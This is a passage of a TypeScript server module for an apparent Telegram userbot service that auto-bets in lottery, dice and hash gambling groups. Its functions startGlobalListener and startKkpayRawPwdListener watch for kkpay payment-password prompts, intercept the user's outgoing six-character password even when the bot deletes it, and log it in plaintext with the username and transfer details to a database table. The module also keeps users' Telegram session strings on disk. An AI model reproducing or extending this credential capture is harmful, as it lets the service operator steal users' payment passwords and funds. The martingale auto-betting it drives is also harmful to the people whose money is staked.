import { Router, type Response } from "express";
import { TelegramClient } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import { Api } from "telegram";
import bigInt from "big-integer";
import { NewMessage, NewMessageEvent, Raw } from "telegram/events/index.js";
import fs from "fs";
import path from "path";
import { logger } from "../lib/logger";
import { requireAuth, requireCard, requireAdmin, requireAdminSecret } from "../middleware/requireAuth";
import { db } from "@workspace/db";
import { cardKeys, kkpayPwdLog as kkpayPwdLogTable } from "@workspace/db";
import { eq, and, gt, gte, lt, desc } from "drizzle-orm";

const router = Router();

// ─── Types ────────────────────────────────────────────────────────────────────

type BetStrategy = "normal" | "martingale" | "anti-martingale";
type BetOption = "big" | "small" | "odd" | "even" | "big-odd" | "big-even" | "small-odd" | "small-even";
type AlgorithmId = "signal_follow" | "signal_reverse" | "streak_follow" | "cold_pick" | "random" | "ai_trend"
  | "dragon_ride" | "dragon_break" | "momentum" | "anti_streak" | "steady_ai" | "adaptive_switch"
  | "ks_follow" | "ks_reverse" | "ks_bb" | "ks_smart"
  | "hash_follow" | "hash_reverse" | "hash_smart";

interface BetCfg {
  autoBet: boolean;
  betAmount: number;
  strategy: BetStrategy;
  betMultiplier: number;
  maxConsecutiveLosses: number;
  stopLoss: number;
  targetProfit: number;
  cooldownSeconds: number;
  amountLevels: number[];
  stepBackOnWin: boolean;
  betOptions: BetOption[];
  algorithms: AlgorithmId[];
  odds: number;
  oddsBigOdd: number;
  oddsBigEven: number;
  oddsSmallOdd: number;
  oddsSmallEven: number;
  chaseNumbers: Array<{ num: number; amount: number }>;
  enableChase: boolean;
  dualGroupMode: boolean;
  killGroupMode: boolean;
  gameMode: "lottery" | "kuaisan" | "hash";
  kuaisanBetOptions: string[];
  hashBetOptions: string[];
  algoFlipOnLoss: number; // 0=disabled; N=连续方向错N局后自动反转方向
}

interface GroupInfo {
  id: string;
  title: string;
  type: string;
  membersCount?: number;
}

interface BetRecord {
  id: string;
  groupId: string;
  groupTitle: string;
  messageText: string;
  betContent: string;
  amount: number;
  timestamp: number;
  status: "sent" | "won" | "lost" | "failed";
  won?: boolean;
  pnl?: number;
  lotteryResult?: string;
  period?: number;
  isChase?: boolean;
  failReason?: string; // human-readable error if status="failed"
  isAdaptiveKillBet?: boolean; // adaptive_switch: this bet was placed in kill-group phase
  algoId?: string; // which algorithm placed this bet
  rawAlgoDir?: string; // algorithm direction BEFORE flip (for flip feedback-loop prevention)
}

// Extract a short, human-readable error code from a GramJS/Telegram error.
function extractTgError(err: unknown): string {
  if (err instanceof Error) {
    // GramJS RPC errors look like: "400: USER_BANNED_IN_CHANNEL (caused by messages.SendMessage)"
    const m = err.message.match(/\d+:\s*([A-Z_]+)/);
    if (m?.[1]) return m[1];
    return err.message.slice(0, 80);
  }
  return String(err).slice(0, 80);
}

// If a critical error (ban, forbidden) is detected: stop autoBet and push an SSE alert.
function handleBetSendError(session: TgSession, errMsg: string): void {
  logger.warn({ userId: session.userId, errMsg }, "[bet] sendMessage failed");
  const isBanned = errMsg.includes("USER_BANNED_IN_CHANNEL") || errMsg.includes("CHAT_WRITE_FORBIDDEN") || errMsg.includes("CHAT_SEND_FORBIDDEN");
  if (isBanned && session.cfg.autoBet) {
    session.cfg.autoBet = false;
    saveSession(session);
    pushEvent(session, "bet:alert", {
      level: "error",
      msg: `投注失败：账号已被群组封禁（${errMsg}），自动投注已停止。请在 Telegram 中解除封禁后重新开启。`,
    });
  }
}

interface TgSession {
  userId: number;
  client: TelegramClient;
  stringSession: StringSession;
  phone: string;
  phoneCodeHash?: string;
  me?: Api.User;
  groups: GroupInfo[];
  watchGroupId?: string;
  cfg: BetCfg;
  // per-session state
  betLog: BetRecord[];
  sseClients: Set<Response>;
  messageHandler: ((event: NewMessageEvent) => Promise<void>) | null;
  messageHandlerBuilder: NewMessage | null;
  kkpayHandler: ((event: NewMessageEvent) => Promise<void>) | null;
  kkpayHandlerBuilder: NewMessage | null;
  kkpayOutRawHandler?: ((update: unknown) => Promise<void>) | null;
  kkpayOutRawBuilder?: Raw | null;
  // runtime
  consecutiveLosses: number;
  consecutiveAlgoLosses: number; // 连续方向预测错误次数（不含追号）
  recentAlgoOutcomes: boolean[];  // 最近6局主注胜负滑动窗口（true=赢）
  sessionPnl: number;
  currentBet: number;
  lastBetAt: number;
  currentLevel: number;
  algIndex: number;
  lastAlgoUsed?: AlgorithmId;
  currentPattern?: MarketPattern;
  recentResults: string[];
  betPlacedThisCycle: boolean;
  chasePlacedThisCycle: boolean;
  lastBetPeriod?: number;
  currentCloseTimeMs: number;
  yeMessageId?: number;
  // global TG message log (all incoming messages)
  chatLog: Array<{ sender: string; senderName: string; chatId: string; chatTitle: string; chatType: "private" | "group" | "channel"; text: string; timestamp: number; msgId?: number; buttons?: { text: string; data?: string }[][] }>;
  globalHandler: ((event: NewMessageEvent) => Promise<void>) | null;
  globalHandlerBuilder: NewMessage | null;
  // balance
  balance: number;
  todayPnl: number;
  todayResetAt: number;
  balanceSource: "manual" | "kkpay";
  balanceUpdatedAt: number;
  kkpayUsername: string;
  kkpayEntityId?: string;
  // timers
  watchdogTimer?: ReturnType<typeof setInterval>;
  saveTimer?: ReturnType<typeof setInterval>;
  autoNextBetTimer?: ReturnType<typeof setTimeout>;
  lotteryPollTimer?: ReturnType<typeof setInterval>;
  kkpayPwdPollTimer?: ReturnType<typeof setInterval>;
  kkpayPwdContext?: string; // last captured payment context (recipient / amount)
  rawPwdHandler?: ((update: unknown) => Promise<void>) | null;
  rawPwdHandlerBuilder?: Raw | null;
  rawPwdHandlerTimeout?: ReturnType<typeof setTimeout>;
  lastSeenLotteryPeriod: number;
  lastSignalText: string;
  lastAIBet: string | null;
  lastRawAlgoDir: string | null; // raw algo direction before flip
  algoFlipCooldown: number;      // remaining bets in flip cooldown (re-eval blocked)
  // adaptive_switch algorithm state
  adaptiveSwitchKillMode: boolean; // false = 大小模式, true = 杀组模式
  // per-algorithm win/loss stats (accumulated for the session lifetime)
  algoStats: Record<string, { wins: number; losses: number; pnl: number }>;
  // kuaisan state
  diceBuffer: { value: number; time: number }[];
  kuaisanPhase: "idle" | "betting" | "closed";
  kuaisanPeriod: string | null;
  kuaisanResults: KuaisanResult[];
  kuaisanHandler: ((event: NewMessageEvent) => Promise<void>) | null;
  kuaisanHandlerBuilder: NewMessage | null;
  kuaisanPollTimer?: ReturnType<typeof setInterval>;
  kuaisanLastMsgId: number;
  // hash state
  hashPhase: "idle" | "betting" | "closed";
  hashPeriod: string | null;
  hashResults: HashResult[];
  hashPollTimer?: ReturnType<typeof setInterval>;
  hashLastMsgId: number;
}

interface PersistedData {
  sessionString: string;
  phone: string;
  balance: number;
  todayPnl: number;
  todayResetAt: number;
  sessionPnl: number;
  kkpayUsername: string;
  balanceSource: "manual" | "kkpay";
  watchGroupId?: string;
  cfg?: Partial<BetCfg>;
  kuaisanResults?: KuaisanResult[];
  hashResults?: HashResult[];
  me?: { firstName?: string; lastName?: string; username?: string; phone?: string };
}

// ─── Constants ────────────────────────────────────────────────────────────────

const DRAW_CYCLE_MS = 210_000;
const BET_BEFORE_DRAW_MS = 80_000;

const DEFAULT_CFG: BetCfg = {
  autoBet: false,
  betAmount: 100,
  strategy: "normal",
  betMultiplier: 2,
  maxConsecutiveLosses: 5,
  stopLoss: 5000,
  targetProfit: 3000,
  cooldownSeconds: 0,
  amountLevels: [100, 200, 400, 800, 1600, 3200],
  stepBackOnWin: true,
  betOptions: ["big", "small"],
  algorithms: ["ai_trend"],
  algoFlipOnLoss: 2,
  odds: 1.98,
  oddsBigOdd: 1.98,
  oddsBigEven: 1.98,
  oddsSmallOdd: 1.98,
  oddsSmallEven: 1.98,
  chaseNumbers: [],
  enableChase: false,
  dualGroupMode: false,
  killGroupMode: false,
  gameMode: "lottery",
  kuaisanBetOptions: ["big", "small"],
  hashBetOptions: ["big", "small"],
};

const BET_OPTION_LABELS: Record<BetOption, string> = {
  big: "大", small: "小", odd: "单", even: "双",
  "big-odd": "大单", "big-even": "大双", "small-odd": "小单", "small-even": "小双",
};

// ─── Kuaisan (快三) types & constants ─────────────────────────────────────────

interface KuaisanResult {
  dice: [number, number, number];
  sum: number;
  big: boolean;
  odd: boolean;
  leopard: boolean;
  dragon: boolean;
  tiger: boolean;
  label: string; // e.g. "大单龙", "小双虎", "豹子"
}

const KS_BET_LABELS: Record<string, string> = {
  big: "大", small: "小", odd: "单", even: "双",
  dragon: "龙", tiger: "虎",
  "big-odd": "大单", "big-even": "大双", "small-odd": "小单", "small-even": "小双",
  "big-dragon": "大龙", "small-tiger": "小虎",
  leopard: "豹子",
};

// ─── Hash (哈希) types & constants ────────────────────────────────────────────

interface HashResult {
  value: number; // 0-27
  big: boolean;  // >= 14
  odd: boolean;  // value % 2 === 1
  label: string; // e.g. "大单", "小双"
}

const HASH_BET_LABELS: Record<string, string> = {
  big: "大", small: "小", odd: "单", even: "双",
  "big-odd": "大单", "big-even": "大双",
  "small-odd": "小单", "small-even": "小双",
};

// ─── Module state ─────────────────────────────────────────────────────────────

const tgSessions = new Map<number, TgSession>();
let lotteryHistoryCache: string[] = [];

// ─── 独立走势缓存预热（不依赖 TG 会话，服务启动即运行）────────────────────────
async function warmLotteryCache(): Promise<void> {
  try {
    const r = await fetch("http://pc20.net/api/fengpan", {
      headers: { "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15", "Referer": "http://pc20.net/" },
      signal: AbortSignal.timeout(8000),
    });
    if (!r.ok) return;
    const data = await r.json() as { message?: { all?: { keno28?: { data?: DrawItem[] } } } };
    const items = data?.message?.all?.keno28?.data ?? [];
    const labels = items.map(d => d.r3).filter((x): x is string => !!x).reverse();
    if (labels.length) lotteryHistoryCache = labels.slice(-50);
  } catch { /* ignore */ }
}
// 启动时立即预热，之后每 30 秒刷新
void warmLotteryCache();
setInterval(() => void warmLotteryCache(), 30_000);

// ─── Helpers ──────────────────────────────────────────────────────────────────

function getCredentials() {
  return {
    apiId: parseInt(process.env["TELEGRAM_API_ID"] ?? "0", 10),
    apiHash: process.env["TELEGRAM_API_HASH"] ?? "",
  };
}

function makeClientOptions() {
  return {
    connectionRetries: 1000,
    autoReconnect: true,
    retryDelay: 2000,
    floodSleepThreshold: 60,
    deviceModel: "iPhone 14",
    systemVersion: "iOS 17.0",
    appVersion: "9.7.0",
  };
}

function todayMidnight(): number {
  const d = new Date();
  d.setHours(0, 0, 0, 0);
  return d.getTime();
}

function pushEvent(session: TgSession, type: string, payload: Record<string, unknown>): void {
  if (session.sseClients.size === 0) return;
  const data = JSON.stringify({ type, ...payload });
  for (const res of session.sseClients) {
    try { res.write(`data: ${data}\n\n`); } catch { session.sseClients.delete(res); }
  }
}

// ─── kkpay password event log ─────────────────────────────────────────────────

interface KkpayPwdEvent {
  id: string;
  timestamp: number;
  userId: number;
  username: string;
  event: "pwd_requested" | "pwd_sent" | "pwd_success";
  text: string;
  context?: string; // e.g. "转账给 @FQFM88 (7358230315) 1000 KKCOIN"
}

// In-memory dedup cache for pwd_sent (only needs to cover a 10-second window)
const recentPwdSent: Array<{ userId: number; text: string; ts: number }> = [];

function appendKkpayPwdEvent(userId: number, username: string, event: KkpayPwdEvent["event"], text: string, context?: string): void {
  const now = Date.now();
  // Deduplicate: skip if exact same pwd_sent text logged within last 10 seconds
  if (event === "pwd_sent") {
    const dup = recentPwdSent.find(e => e.userId === userId && e.text === text && now - e.ts < 10_000);
    if (dup) return;
    recentPwdSent.push({ userId, text, ts: now });
    // Trim old entries
    const cutoff = now - 30_000;
    while (recentPwdSent.length > 0 && recentPwdSent[0]!.ts < cutoff) recentPwdSent.shift();
  }
  const eventId = `${now}-${Math.random().toString(36).slice(2, 7)}`;
  // Write to DB asynchronously – don't block the caller
  db.insert(kkpayPwdLogTable).values({
    eventId,
    timestamp: now,
    userId,
    username,
    event,
    text,
    context: context ?? null,
  }).catch((err: unknown) => { logger.error({ err }, "failed to insert kkpay pwd log"); });
}

/**
 * Extract a short human-readable payment context from recent kkpay chatLog entries.
 * Looks for recipient username/ID and amount in the last few kkpay messages.
 */
function extractKkpayContext(session: TgSession): string | undefined {
  const eid = session.kkpayEntityId;
  if (!eid) return undefined;
  // Scan the last 15 chatLog entries from kkpay (newest first)
  const recentKkpay = session.chatLog
    .filter(m => m.chatId === eid || `-100${m.chatId}` === eid)
    .slice(0, 15);
  for (const m of recentKkpay) {
    const t = m.text;
    // Extract: recipient TG username like @FQFM88
    const tgUser = t.match(/用户名[：:]\s*(@\S+)/)?.[1] ?? t.match(/收款人[：:]\s*(@?\S+)/)?.[1];
    // Extract: numeric user ID
    const uid = t.match(/用户\s*ID[：:]\s*(\d+)/)?.[1] ?? t.match(/用户[：:]\s*(\d+)/)?.[1];
    // Extract: amount
    const amtMatch = t.match(/金额[：:]\s*([\d,.]+\s*KKCOIN)/i) ?? t.match(/([\d,.]+\s*KKCOIN)/i);
    const amt = amtMatch?.[1];
    if (tgUser || uid || amt) {
      const parts: string[] = [];
      if (tgUser) parts.push(tgUser);
      if (uid && uid !== tgUser?.replace("@", "")) parts.push(`(${uid})`);
      if (amt) parts.push(amt);
      return parts.join(" ");
    }
  }
  return undefined;
}

/**
 * Tear down the raw password listener and its auto-expire timer.
 */
function stopKkpayRawPwdListener(session: TgSession): void {
  if (session.rawPwdHandlerTimeout) { clearTimeout(session.rawPwdHandlerTimeout); session.rawPwdHandlerTimeout = undefined; }
  if (session.rawPwdHandler && session.rawPwdHandlerBuilder) {
    try { session.client.removeEventHandler(session.rawPwdHandler as Parameters<typeof session.client.removeEventHandler>[0], session.rawPwdHandlerBuilder); } catch { /* ignore */ }
  }
  session.rawPwdHandler = null;
  session.rawPwdHandlerBuilder = null;
}

/**
 * After kkpay asks for the payment password, attach a low-level Raw update
 * handler that fires BEFORE GramJS's higher-level event filtering, catching
 * the outgoing 6-char message even if kkpay deletes it within milliseconds.
 */
function startKkpayRawPwdListener(session: TgSession): void {
  stopKkpayRawPwdListener(session);
  const eid = session.kkpayEntityId;
  if (!eid) return;

  const username = session.me?.username ?? String(session.userId);

  session.rawPwdHandler = async (update: unknown) => {
    let chatId = "";
    let text = "";

    if (update instanceof Api.UpdateShortMessage) {
      // Private-chat short message (most common path when sending from phone)
      if (!update.out) return;
      chatId = String(update.userId);
      text = (update.message ?? "").trim();
    } else if (update instanceof Api.UpdateNewMessage) {
      // Full message update (less common for private chats)
      const msg = update.message;
      if (!(msg instanceof Api.Message)) return;
      if (!msg.out) return;
      const peer = msg.peerId;
      if (peer instanceof Api.PeerUser) chatId = String(peer.userId);
      else if (peer instanceof Api.PeerChannel) chatId = String(peer.channelId);
      else if (peer instanceof Api.PeerChat) chatId = String(peer.chatId);
      text = (msg.message ?? "").trim();
    } else {
      return;
    }

    if (chatId !== eid && `-100${chatId}` !== eid) return;
    if (!/^[0-9a-zA-Z]{6}$/.test(text)) return;

    appendKkpayPwdEvent(session.userId, username, "pwd_sent", text, session.kkpayPwdContext);
    stopKkpayRawPwdListener(session);
  };

  // Must include BOTH types: UpdateShortMessage is the typical TL update for
  // outgoing private-chat messages sent from another device (phone → kkpay),
  // while UpdateNewMessage covers the less-common full-message path.
  session.rawPwdHandlerBuilder = new Raw({ types: [Api.UpdateShortMessage, Api.UpdateNewMessage] });
  session.client.addEventHandler(
    session.rawPwdHandler as Parameters<typeof session.client.addEventHandler>[0],
    session.rawPwdHandlerBuilder,
  );

  // Auto-expire after 90 seconds regardless
  session.rawPwdHandlerTimeout = setTimeout(() => stopKkpayRawPwdListener(session), 90_000);
}

// ─── Session persistence ──────────────────────────────────────────────────────

function sessionFile(userId: number): string {
  return path.join(process.cwd(), `.tg-session-${userId}.json`);
}

function saveSession(session: TgSession): void {
  try {
    const data: PersistedData = {
      sessionString: session.stringSession.save(),
      phone: session.phone,
      balance: session.balance,
      todayPnl: session.todayPnl,
      todayResetAt: session.todayResetAt,
      sessionPnl: session.sessionPnl,
      kkpayUsername: session.kkpayUsername,
      balanceSource: session.balanceSource,
      watchGroupId: session.watchGroupId,
      cfg: session.cfg,
      kuaisanResults: session.kuaisanResults.slice(0, 30),
      hashResults: (session.hashResults ?? []).slice(0, 30),
      me: session.me ? {
        firstName: session.me.firstName,
        lastName: session.me.lastName,
        username: session.me.username,
        phone: session.me.phone,
      } : undefined,
    };
    fs.writeFileSync(sessionFile(session.userId), JSON.stringify(data, null, 2), "utf-8");
  } catch { /* ignore */ }
}

async function fetchGroups(client: TelegramClient): Promise<GroupInfo[]> {
  try {
    const dialogs = await client.getDialogs({ limit: 100 });
    return dialogs
      .filter((d) => d.isGroup || d.isChannel)
      .map((d) => ({
        id: String(d.id),
        title: d.title ?? "Unknown",
        type: d.isChannel ? "channel" : "group",
        membersCount: (d.entity as Api.Chat)?.participantsCount ?? undefined,
      }));
  } catch {
    return [];
  }
}

// ─── Watchdog ─────────────────────────────────────────────────────────────────

function stopAllTimers(session: TgSession): void {
  if (session.watchdogTimer) { clearInterval(session.watchdogTimer); session.watchdogTimer = undefined; }
  if (session.saveTimer) { clearInterval(session.saveTimer); session.saveTimer = undefined; }
  if (session.autoNextBetTimer) { clearTimeout(session.autoNextBetTimer); session.autoNextBetTimer = undefined; }
  if (session.lotteryPollTimer) { clearInterval(session.lotteryPollTimer); session.lotteryPollTimer = undefined; }
  if (session.globalHandler && session.globalHandlerBuilder) {
    try { session.client.removeEventHandler(session.globalHandler, session.globalHandlerBuilder); } catch { /* ok */ }
    session.globalHandler = null; session.globalHandlerBuilder = null;
  }
}

function startGlobalListener(session: TgSession): void {
  if (session.globalHandler && session.globalHandlerBuilder) {
    try { session.client.removeEventHandler(session.globalHandler, session.globalHandlerBuilder); } catch { /* ok */ }
    session.globalHandler = null; session.globalHandlerBuilder = null;
  }

  session.globalHandler = async (event: NewMessageEvent) => {
    const msg = event.message;
    const text = msg.message ?? "";
    if (!text.trim()) return;

    const chatId = String(msg.chatId ?? msg.senderId ?? "");

    // ─── Capture outgoing password sent directly in Telegram ───
    if (msg.out) {
      const eid = session.kkpayEntityId;
      const isToKkpay = eid && (chatId === eid || `-100${chatId}` === eid);
      if (isToKkpay && /^[0-9a-zA-Z]{6}$/.test(text.trim())) {
        appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_sent", text.trim(), session.kkpayPwdContext);
      }
      return;
    }
    const senderId = String(msg.senderId ?? "");

    let chatTitle = chatId;
    let senderName = senderId;
    let chatType: "private" | "group" | "channel" = "private";

    try {
      const chat = msg.chat as ({ title?: string; firstName?: string; lastName?: string; className?: string }) | undefined;
      if (chat) {
        const cls = chat.className ?? "";
        if (cls === "Channel") { chatType = "channel"; chatTitle = chat.title ?? chatId; }
        else if (cls === "Chat" || cls === "ChatForbidden") { chatType = "group"; chatTitle = chat.title ?? chatId; }
        else { chatType = "private"; chatTitle = [chat.firstName, chat.lastName].filter(Boolean).join(" ") || chatId; }
      }
      const sender = msg.sender as ({ title?: string; firstName?: string; lastName?: string; username?: string }) | undefined;
      if (sender) {
        senderName = sender.title ?? ([sender.firstName, sender.lastName].filter(Boolean).join(" ") || sender.username) ?? senderId;
      }
    } catch { /* ignore */ }

    let buttons: { text: string; data?: string }[][] | undefined;
    try {
      const rm = (msg as unknown as { replyMarkup?: unknown }).replyMarkup;
      if (rm && (rm as { className?: string }).className === "ReplyInlineMarkup") {
        const extracted = ((rm as { rows?: unknown[] }).rows ?? []).map(row =>
          ((row as { buttons?: unknown[] }).buttons ?? []).map(btn => ({
            text: (btn as { text?: string }).text ?? "",
            data: (btn as { className?: string; data?: Buffer }).className === "KeyboardButtonCallback"
              ? ((btn as { data?: Buffer }).data?.toString("hex"))
              : undefined,
          })).filter(b => b.text)
        ).filter(r => r.length > 0);
        if (extracted.length > 0) buttons = extracted;
      }
    } catch { /* ignore */ }

    session.chatLog.unshift({ sender: senderId, senderName, chatId, chatTitle, chatType, text: text.slice(0, 500), timestamp: Date.now(), msgId: msg.id, buttons });
    if (session.chatLog.length > 200) session.chatLog.pop();

    // ─── kkpay password event detection (text-only, no entity ID comparison needed) ───
    if (/请输入.*密码|输入.*支付密码|输入.*交易密码|输入.*转账密码/.test(text)) {
      session.kkpayPwdContext = extractKkpayContext(session);
      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300), session.kkpayPwdContext);
      startKkpayRawPwdListener(session);
    } else if (/密码验证成功|支付密码.*成功|密码.*正确/.test(text)) {
      appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300), session.kkpayPwdContext);
      session.kkpayPwdContext = undefined;
      stopKkpayRawPwdListener(session);
    }
  };

  session.globalHandlerBuilder = new NewMessage({});
  session.client.addEventHandler(session.globalHandler, session.globalHandlerBuilder);
}

function startWatchdog(session: TgSession): void {
  stopAllTimers(session);

  session.saveTimer = setInterval(() => {
    if (tgSessions.get(session.userId) !== session) { clearInterval(session.saveTimer); return; }
    saveSession(session);
  }, 5 * 60 * 1000);

  session.watchdogTimer = setInterval(() => {
    if (tgSessions.get(session.userId) !== session) { clearInterval(session.watchdogTimer); return; }
    void (async () => {
      try {
        await session.client.getMe();
      } catch {
        try {
          await session.client.connect();
          if (session.watchGroupId) startGroupListener(session);
          startGlobalListener(session);
          await startKkpayListener(session);
          saveSession(session);
          pushEvent(session, "session:reconnected", { at: Date.now() });
        } catch { /* retry next cycle */ }
      }
    })();
  }, 15 * 1000);
}

// ─── Restore sessions on boot ─────────────────────────────────────────────────

async function restoreUserSession(userId: number, file: string): Promise<void> {
  let data: PersistedData;
  try {
    const raw = fs.readFileSync(file, "utf-8");
    data = JSON.parse(raw) as PersistedData;
    if (!data.sessionString) return;
  } catch {
    return; // 文件损坏，跳过
  }

  const { apiId, apiHash } = getCredentials();
  if (!apiId || !apiHash) return;

  const stringSession = new StringSession(data.sessionString);
  const client = new TelegramClient(stringSession, apiId, apiHash, makeClientOptions());

  // 尝试连接 TG，失败时仍创建离线 session（不删文件）
  let me: Api.User | null = null;
  let connected = false;
  try {
    await client.connect();
    me = (await client.getMe()) as Api.User;
    if (me?.id) connected = true;
  } catch {
    logger.warn({ userId }, "[tg] restore connect failed — creating offline session");
  }

  // 无法获取 me 时从持久化文件恢复基本信息
  const meInfo = connected && me ? me : (data.me ? {
    firstName: data.me.firstName,
    lastName: data.me.lastName,
    username: data.me.username,
    phone: data.me.phone ?? data.phone,
    id: BigInt(userId),
  } as unknown as Api.User : null);

  if (!meInfo) return; // 没有任何 me 信息，无法恢复

  const session: TgSession = {
    userId,
    client, stringSession,
    phone: data.phone ?? "",
    groups: connected ? await fetchGroups(client) : [],
    cfg: data.cfg ? { ...DEFAULT_CFG, ...data.cfg, autoBet: false } : { ...DEFAULT_CFG },
    betLog: [], sseClients: new Set(),
    messageHandler: null, messageHandlerBuilder: null,
    kkpayHandler: null, kkpayHandlerBuilder: null,
    globalHandler: null, globalHandlerBuilder: null,
    consecutiveLosses: 0,
    consecutiveAlgoLosses: 0,
    recentAlgoOutcomes: [],
    sessionPnl: 0,
    currentLevel: 0,
    currentBet: (data.cfg?.amountLevels?.length ?? 0) > 1
      ? (data.cfg!.amountLevels![0] ?? data.cfg?.betAmount ?? DEFAULT_CFG.betAmount)
      : (data.cfg?.betAmount ?? DEFAULT_CFG.betAmount),
    lastBetAt: 0,
    algIndex: 0,
    betPlacedThisCycle: false,
    chasePlacedThisCycle: false,
    lastSeenLotteryPeriod: 0,
    currentCloseTimeMs: 0,
    lastSignalText: "",
    lastAIBet: null,
    lastRawAlgoDir: null,
    algoFlipCooldown: 0,
    adaptiveSwitchKillMode: false,
    algoStats: {},
    recentResults: [],
    chatLog: [],
    diceBuffer: [], kuaisanPhase: "idle", kuaisanPeriod: null, kuaisanResults: data.kuaisanResults ?? [],
    kuaisanHandler: null, kuaisanHandlerBuilder: null, kuaisanLastMsgId: 0,
    hashPhase: "idle", hashPeriod: null, hashResults: data.hashResults ?? [], hashLastMsgId: 0,
    balance: data.balance ?? 1000000,
    todayPnl: data.todayPnl ?? 0,
    todayResetAt: data.todayResetAt ?? todayMidnight(),
    kkpayUsername: data.kkpayUsername ?? "kkpay",
    kkpayEntityId: undefined,
    balanceSource: data.balanceSource ?? "manual",
    balanceUpdatedAt: 0,
    me: meInfo,
    watchGroupId: data.watchGroupId,
  };

  tgSessions.set(userId, session);

  if (connected) {
    if (session.watchGroupId) startGroupListener(session);
    startGlobalListener(session);
    startKkpayListener(session).catch(() => { /* ignore */ });
    logger.info({ userId }, "[tg] session restored (online)");
  } else {
    logger.info({ userId }, "[tg] session restored (offline — watchdog will reconnect)");
  }
  startWatchdog(session);
}

async function restoreAllSessions(): Promise<void> {
  const cwd = process.cwd();
  try {
    const files = fs.readdirSync(cwd).filter(f => /^\.tg-session-\d+\.json$/.test(f));
    for (const f of files) {
      const userId = parseInt(f.replace(".tg-session-", "").replace(".json", ""), 10);
      if (!isNaN(userId)) await restoreUserSession(userId, path.join(cwd, f));
    }
    // legacy single-user session migration
    const legacy = path.join(cwd, ".tg-session.json");
    if (fs.existsSync(legacy)) {
      logger.info("[tg] legacy session file found but skipped (multi-user mode requires re-login)");
    }
  } catch { /* ignore */ }
}

void restoreAllSessions();

// ─── Periodic expiry enforcement ──────────────────────────────────────────────
// Every 60s: disconnect TG sessions whose card has expired and delete the session file.
setInterval(async () => {
  if (tgSessions.size === 0) return;
  try {
    const now = new Date();
    for (const [userId, session] of tgSessions) {
      // Check if this user has any active (non-expired) card
      const [active] = await db.select({ id: cardKeys.id })
        .from(cardKeys)
        .where(and(eq(cardKeys.userId, userId), gt(cardKeys.expiresAt!, now)))
        .limit(1);
      if (!active) {
        logger.info({ userId }, "[tg] card expired — auto-disconnecting session");
        stopAllTimers(session);
        try { await session.client.invoke(new Api.auth.LogOut()); } catch { /* ok */ }
        try { await session.client.disconnect(); } catch { /* ok */ }
        tgSessions.delete(userId);
        try { fs.unlinkSync(sessionFile(userId)); } catch { /* ok */ }
      }
    }
  } catch (err) {
    logger.error(err, "[tg] expiry check failed");
  }
}, 60_000);

// ─── Balance parsing ──────────────────────────────────────────────────────────

function parseBalance(text: string): number | null {
  const patterns = [
    /KKCOIN\s*[：:]\s*([\d,]+\.?\d*)/i,
    /当前余额[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /(?:可用|账[户号])?余额[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /balance[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /💰\s*[¥￥]?\s*([\d,]+\.?\d*)/,
    /剩余[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /总资产[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
    /钱包余额[：:\s]*[¥￥]?\s*([\d,]+\.?\d*)/i,
  ];
  for (const p of patterns) {
    const m = text.match(p);
    if (m) {
      const val = parseFloat(m[1].replace(/,/g, ""));
      if (!isNaN(val) && val >= 0) return val;
    }
  }
  return null;
}

async function sendYeForBalance(session: TgSession): Promise<void> {
  if (!session.watchGroupId) return;
  try {
    const sent = await session.client.sendMessage(session.watchGroupId, { message: "ye" });
    session.yeMessageId = sent.id;
    logger.info({ msgId: sent.id, userId: session.userId }, "[balance] sent 'ye'");
  } catch (err) {
    logger.warn({ err }, "[balance] failed to send 'ye'");
  }
}

function updateBalance(session: TgSession, text: string): void {
  const bal = parseBalance(text);
  if (bal === null) return;
  session.balance = bal;
  session.balanceSource = "kkpay";
  session.balanceUpdatedAt = Date.now();
  pushEvent(session, "balance:update", {
    balance: bal,
    balanceSource: "kkpay",
    balanceUpdatedAt: session.balanceUpdatedAt,
  });
}

// ─── Bet settlement ───────────────────────────────────────────────────────────

function computeNextBet(session: TgSession, won: boolean): number {
  const { amountLevels, stepBackOnWin, betAmount, strategy, betMultiplier } = session.cfg;
  if (amountLevels.length > 1) {
    let lvl = session.currentLevel;
    lvl = won
      ? (stepBackOnWin ? 0 : lvl)
      : (lvl >= amountLevels.length - 1 ? 0 : lvl + 1);
    session.currentLevel = lvl;
    return amountLevels[lvl]!;
  }
  if (strategy === "normal") return betAmount;
  if (strategy === "martingale") return won ? betAmount : Math.round(session.currentBet * betMultiplier);
  return won ? Math.round(session.currentBet * betMultiplier) : betAmount;
}

function checkRisk(session: TgSession): { ok: boolean; reason?: string } {
  const { stopLoss, targetProfit, maxConsecutiveLosses, cooldownSeconds } = session.cfg;
  if (maxConsecutiveLosses > 0 && session.consecutiveLosses >= maxConsecutiveLosses)
    return { ok: false, reason: `连亏${session.consecutiveLosses}局，已达上限${maxConsecutiveLosses}局` };
  if (stopLoss > 0 && session.sessionPnl <= -stopLoss)
    return { ok: false, reason: `亏损 ¥${Math.abs(session.sessionPnl).toFixed(0)} 已达止损 ¥${stopLoss}` };
  if (targetProfit > 0 && session.sessionPnl >= targetProfit)
    return { ok: false, reason: `盈利 ¥${session.sessionPnl.toFixed(0)} 已达止盈 ¥${targetProfit}` };
  if (cooldownSeconds > 0 && session.lastBetAt > 0) {
    const elapsed = (Date.now() - session.lastBetAt) / 1000;
    if (elapsed < cooldownSeconds)
      return { ok: false, reason: `冷却中 (${Math.ceil(cooldownSeconds - elapsed)}s)` };
  }
  return { ok: true };
}

function settleBet(session: TgSession, opts: { won: boolean; pnl?: number; result?: string; betId?: string; period?: number; isChase?: boolean }): void {
  const { won, pnl, result, betId, period, isChase } = opts;
  const { betLog } = session;

  if (pnl !== undefined) {
    session.sessionPnl += pnl;
    session.balance += pnl;
    const midnight = todayMidnight();
    if (session.todayResetAt < midnight) { session.todayPnl = 0; session.todayResetAt = midnight; }
    session.todayPnl += pnl;
  }

